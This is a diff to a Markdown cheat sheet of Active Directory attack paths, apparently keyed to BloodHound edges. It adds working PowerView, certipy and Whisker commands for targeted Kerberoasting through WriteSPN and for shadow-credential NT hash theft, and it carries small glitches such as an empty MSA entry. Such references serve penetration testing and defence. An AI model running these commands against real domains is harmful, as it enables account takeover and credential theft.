@@ -18,6 +18,9 @@ The Distributed File System provide the ability to group shares on multiple serv
 ## Domain Joined Computer 
 A Windows computer for which a computer account has been created. This computer takes over the settings from the Active Directory.
 
+## DPAPI
+The Data Protection Api is a cryptographic application programming interface used by to store credentials locally.
+
 ## fCONFIDENTIAL
 If this flag is set for an LDAP attribute, only accounts with the permissions RIGHT_DS_READ_PROPERTY and RIGHT_DS_CONTROL_ACCESS can read the attribute (example: ms-Mcs-AdmPwd).
 
@@ -35,6 +38,11 @@ The Local Administrator Password Solution is a tool for storing local admin pass
 
 ## LDAP 
 The Lightweight Directory Access Protocol is a network protocol for querying and modifying information from distributed directory services. The protocol listens on port 389 and 636 (LDAP over SSL).
+
+## MSA
+
+## msDS-GroupMSAMembership
+This attribute is used for access checks to determine if a requestor has permission to retrieve the password for a group Microsoft Account.
 
 ## msDS-KeyCredentialLink
 LDAP attribute that holds the public key of the TPM if the Key Trust model is implemented
@@ -460,6 +468,18 @@ Get-NetComputer <targetComputer> -Properties 'msds-allowedtoactonbehalfofotherid
 
 Now we can perform a Resource Based Constrained Delegation attack (see AllowedToAct)
 
+
+## AddKeyCredentialLink
+
+Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform a Kerberos Authentication as that account using PKINIT to retrieve the NT hash.
+
+```
+$> certipy shadow auto '<domain>/<user>:<password>'@<certificateAuthorityRhost> -account '<targetComputerOrUser>'
+or
+PS> Whisker.exe add /target:<targetAccount>
+```
+
+
 ## ForceChangePassword
 This edge indicates that the source node (user or group) can replace the password of the destination node (user, group, computer).
 This can be done with native cmd commands:
@@ -501,6 +521,10 @@ Cleanup using:
 ```
 PS> Remove-DomainGroupMember -Identity <targetGroup> -Members <targetUser> -Verbose
 ```
+
+## AddSelf
+This edge indicates the principal has the ability to add itself to the target security group.
+See AddMember
 
 ## ReadLAPSPassword
 This edge indicates that the source node (user or group) can read the password for the local administrator account (LAPS) on the target computer via LDAP.
@@ -681,6 +705,19 @@ PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<att
 PS> Set-DomainObjectOwner -Credential $Cred -PrincipalIdentity "<targetObject>" -OwnerIdentity <attackerUser>
 ```
 
+## WriteSPN
+The ability to write directly to the servicePrincipalNames attribute on a user object.
+This can be done with the help of Powerview:
+
+```
+PS> $SecPassword = ConvertTo-SecureString '<attackerPassword>' -AsPlainText -Force
+PS> $Cred = New-Object System.Management.Automation.PSCredential('<domain>\\<attackerUser>', $SecPassword)
+PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -SET @{serviceprincipalname='<service>/<hostname>'}
+PS> Get-DomainSPNTicket -Credential $Cred <targetAccount> | fl
+		PS> Set-DomainObject -Credential $Cred -Identity <targetAccount> -Clear serviceprincipalname
+```
+
+
 ## GpLink
 The edge indicates that the source node (GPO) is linked to the target node (OU or domain).
 A dashed edge means that the GPO is not enforced.
@@ -841,14 +878,6 @@ Get NT hash of domain controller:
 
 ```
 $> certipy auth -pfx '<file>.pfx' -username '<user>' -domain '<domain>' -dc-ip <domainController>
-```
-
-## AddKeyCredentialLink
-
-Add Key Credentials to the attribute msDS-KeyCredentialLink of the target user/computer object and then perform a Kerberos Authentication as that account using PKINIT to retrieve the NT hash.
-
-```
-$> certipy shadow auto '<domain>/<user>:<password>'@<certificateAuthorityRhost> -account '<targetComputerOrUser>'
 ```
 
 
